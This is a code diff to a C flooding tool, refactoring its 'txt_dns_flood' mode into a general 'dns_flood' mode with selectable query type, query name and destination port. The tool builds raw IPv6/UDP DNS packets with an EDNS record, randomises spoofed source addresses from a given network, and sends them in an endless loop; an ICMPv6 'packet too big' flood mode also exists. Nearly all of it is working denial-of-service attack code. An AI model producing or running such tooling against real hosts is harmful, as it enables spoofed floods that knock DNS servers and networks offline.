@@ -43,7 +43,7 @@ struct {
 			uint8_t m[256];
 			size_t len;
 		} rname;
-	} txt;
+	} dns;
 } gctx;
 
 struct {
@@ -65,8 +65,16 @@ struct {
 	} flags;
 	int v;
 	const char *mode;
-	const char *txt;
+	struct {
+		const char *rname;
+		uint16_t rtype;
+	} dns;
+	uint16_t dst_port;
 } param;
+
+void init_params (void) {
+	param.dns.rtype = 16; // TXT
+}
 
 static void init_global (void) {
 	gctx.fd.urnd = -1;
@@ -110,18 +118,21 @@ static void genrnd (const size_t len, void *out) {
 
 static void print_help (FILE *f) {
 	fprintf(f,
-"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] <-m MODE>|<--mode MODE>"
-"       [-T TXT]|[--txt TXT] [--] SRC_NET DST_ADDR\n"
-"MODE:        'ptb_flood_icmp6_echo' | 'txt_dns_flood'\n"
+"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT]"
+"       [-T|--rtype RTYPE] [-R|--rname RNAME] <--mode|-m MODE> [--]\n"
+"       SRC_NET DST_ADDR\n"\
+"MODE:        'ptb_flood_icmp6_echo' | 'dns_flood'\n"
 "SRC_NET:     2001:db8:1:2::/64\n"
 "DST_ADDR:    any string accepted by getaddrinfo()\n"
 "Options:\n"
-"  -m, --mode MODE  run in specified mode\n"
-"  -T, --txt TXT    TXT rname to use in query\n"
-"  -d, --dryrun     run in dry mode (don't actually send anything)\n"
-"  -v, --verbose    increase verbosity\n"
-"  -q, --quiet      report errors only\n"
-"  -h, --help       print this message and exit normally\n"
+"  -m, --mode MODE      run in specified mode\n"
+"  -p, --dst-port PORT  override destination port\n"
+"  -R, --rname RNAME    QNAME to use in queries\n"
+"  -T, --rtype RTYPE    numeric QTYPE to use in queries (default: 16 (TXT))\n"
+"  -d, --dryrun         run in dry mode (don't actually send anything)\n"
+"  -v, --verbose        increase verbosity\n"
+"  -q, --quiet          report errors only\n"
+"  -h, --help           print this message and exit normally\n"
 		,
 		ARGV0);
 };
@@ -370,23 +381,23 @@ static void foreach_label (
 }
 
 static bool label_rname (char *label, uint8_t len, void *) {
-	assert(gctx.txt.rname.len + len < sizeof(gctx.txt.rname));
+	assert(gctx.dns.rname.len + len < sizeof(gctx.dns.rname));
 
-	gctx.txt.rname.m[gctx.txt.rname.len] = len;
-	memcpy(gctx.txt.rname.m + 1 + gctx.txt.rname.len, label, len);
-	gctx.txt.rname.len += (size_t)len + 1;
+	gctx.dns.rname.m[gctx.dns.rname.len] = len;
+	memcpy(gctx.dns.rname.m + 1 + gctx.dns.rname.len, label, len);
+	gctx.dns.rname.len += (size_t)len + 1;
 
 	return true;
 }
 
-void mount_attack_dns_txt_flood (void) {
+void mount_attack_dns_flood (void) {
 	struct {
 		struct ip6_hdr ih6;
 		struct udphdr udp;
 		uint8_t data[512];
 	} snd_buf = { 0, };
 	ssize_t fr;
-	const uint16_t data_len = (uint16_t)gctx.txt.rname.len + 27;
+	const uint16_t data_len = (uint16_t)gctx.dns.rname.len + 27;
 
 	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
 	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
@@ -396,7 +407,7 @@ void mount_attack_dns_txt_flood (void) {
 		(uint16_t)sizeof(struct udphdr) +
 		data_len
 	);
-	snd_buf.udp.uh_dport = param.dst.sa.sin6_port = htons(53);
+	snd_buf.udp.uh_dport = htons(param.dst_port);
 	snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);
 
 	// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
@@ -411,31 +422,31 @@ void mount_attack_dns_txt_flood (void) {
 	snd_buf.data[10] = 0x00;
 	snd_buf.data[11] = 0x01;
 	// QNAME
-	memcpy(snd_buf.data + 12, gctx.txt.rname.m, gctx.txt.rname.len);
-	// QTYPE: TXT
-	snd_buf.data[gctx.txt.rname.len + 12] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 13] = 0x10;
+	memcpy(snd_buf.data + 12, gctx.dns.rname.m, gctx.dns.rname.len);
+	// QTYPE
+	snd_buf.data[gctx.dns.rname.len + 12] = (uint8_t)((param.dns.rtype & 0xff00) >> 8);
+	snd_buf.data[gctx.dns.rname.len + 13] = (uint8_t)(param.dns.rtype & 0x00ff);
 	// QCLASS: IN
-	snd_buf.data[gctx.txt.rname.len + 14] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 15] = 0x01;
+	snd_buf.data[gctx.dns.rname.len + 14] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 15] = 0x01;
 
 	// NAME: ROOT
-	snd_buf.data[gctx.txt.rname.len + 16] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 16] = 0x00;
 	// OPT
-	snd_buf.data[gctx.txt.rname.len + 17] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 18] = 0x29;
+	snd_buf.data[gctx.dns.rname.len + 17] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 18] = 0x29;
 	// UDP payload size: 1298
-	snd_buf.data[gctx.txt.rname.len + 19] = 0x05;
-	snd_buf.data[gctx.txt.rname.len + 20] = 0x12;
+	snd_buf.data[gctx.dns.rname.len + 19] = 0x05;
+	snd_buf.data[gctx.dns.rname.len + 20] = 0x12;
 
-	snd_buf.data[gctx.txt.rname.len + 21] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 22] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 21] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 22] = 0x00;
 
-	snd_buf.data[gctx.txt.rname.len + 23] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 24] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 23] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 24] = 0x00;
 	// Data length: 0
-	snd_buf.data[gctx.txt.rname.len + 25] = 0x00;
-	snd_buf.data[gctx.txt.rname.len + 26] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
+	snd_buf.data[gctx.dns.rname.len + 26] = 0x00;
 
 	for (size_t it = 0; ; it += 1) {
 		genrnd_src_addr(&snd_buf.ih6.ip6_src);
@@ -474,18 +485,18 @@ void mount_attack_dns_txt_flood (void) {
 }
 
 static void init_dns_txt_labels (void) {
-	gctx.txt.rname.len = 0;
-	foreach_label(param.txt, NULL, label_rname);
-	assert(gctx.txt.rname.len < sizeof(gctx.txt.rname.m));
+	gctx.dns.rname.len = 0;
+	foreach_label(param.dns.rname, NULL, label_rname);
+	assert(gctx.dns.rname.len < sizeof(gctx.dns.rname.m));
 }
 
-static int main_txt_dns_flood (void) {
+static int main_dns_flood (void) {
 	// TODO: parallelise?
 	init_dns_txt_labels();
 
 	seedrnd();
 
-	mount_attack_dns_txt_flood();
+	mount_attack_dns_flood();
 
 	return 0;
 }
@@ -549,19 +560,21 @@ static bool parse_net_str (
 
 static bool parse_param (const int argc, const char **argv) {
 	static const struct option LOPTS[] = {
-		{ "help",    false, NULL, 'h' },
-		{ "dryrun",  false, NULL, 'd' },
-		{ "quiet",   false, NULL, 'q' },
-		{ "mode",    true,  NULL, 'm' },
-		{ "verbose", false, NULL, 'v' },
-		{ "txt",     true,  NULL, 'T' },
+		{ "help",     false, NULL, 'h' },
+		{ "dryrun",   false, NULL, 'd' },
+		{ "quiet",    false, NULL, 'q' },
+		{ "mode",     true,  NULL, 'm' },
+		{ "verbose",  false, NULL, 'v' },
+		{ "rname",    true,  NULL, 'R' },
+		{ "rtype",    true,  NULL, 'T' },
+		{ "dst-port", true,  NULL, 'p' },
 	};
 	int loi = -1;
 	int fr;
 	bool fallthrough = false;
 
 	while (true) {
-		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:", LOPTS, &loi);
+		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:", LOPTS, &loi);
 		if (fr < 0) {
 			break;
 		}
@@ -572,7 +585,25 @@ static bool parse_param (const int argc, const char **argv) {
 		case 'q': param.flags.quiet = true; break;
 		case 'm': param.mode = optarg; break;
 		case 'v': param.v += 1; break;
-		case 'T': param.txt = optarg; break;
+		case 'R': param.dns.rname = optarg; break;
+		case 'T':
+			if (sscanf(optarg, "%"SCNu16, &param.dns.rtype) != 1 ||
+					param.dns.rtype == 0)
+			{
+				errno = EINVAL;
+				fprintf(stderr, ARGV0": -T %s: ", optarg);
+				perror(NULL);
+				return false;
+			}
+			break;
+		case 'p':
+			if (sscanf(optarg, "%"SCNu16, &param.dst_port) != 1) {
+				errno = EINVAL;
+				fprintf(stderr, ARGV0": -p %s: ", optarg);
+				perror(NULL);
+				return false;
+			}
+			break;
 		default: return false;
 		}
 	}
@@ -582,7 +613,7 @@ static bool parse_param (const int argc, const char **argv) {
 	}
 
 	if (param.mode == NULL) {
-		fprintf(stderr, ARGV0": missing option -m\n");
+		fprintf(stderr, ARGV0": missing option -m. Run with -h option for help\n");
 		return false;
 	}
 
@@ -649,6 +680,7 @@ static bool resolve_dst (void) {
 int main (const int argc, const char **argv) {
 	int ec = 0;
 
+	init_params();
 	init_global();
 
 	if (!parse_param(argc, argv)) {
@@ -679,14 +711,18 @@ int main (const int argc, const char **argv) {
 	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
 		ec = main_ptb_flood_icmp6_echo();
 	}
-	else if (strcmp(param.mode, "txt_dns_flood") == 0) {
-		if (param.txt == NULL) {
-			fprintf(stderr, ARGV0": missing option -T\n");
+	else if (strcmp(param.mode, "dns_flood") == 0) {
+		if (param.dns.rname == NULL) {
+			fprintf(stderr, ARGV0": missing option -R. Run with -h option for help\n");
 			ec = 2;
 			goto END;
 		}
 
-		ec = main_txt_dns_flood();
+		if (param.dst_port == 0) {
+			param.dst_port = 53;
+		}
+
+		ec = main_dns_flood();
 	}
 	else {
 		fprintf(stderr, ARGV0": ");
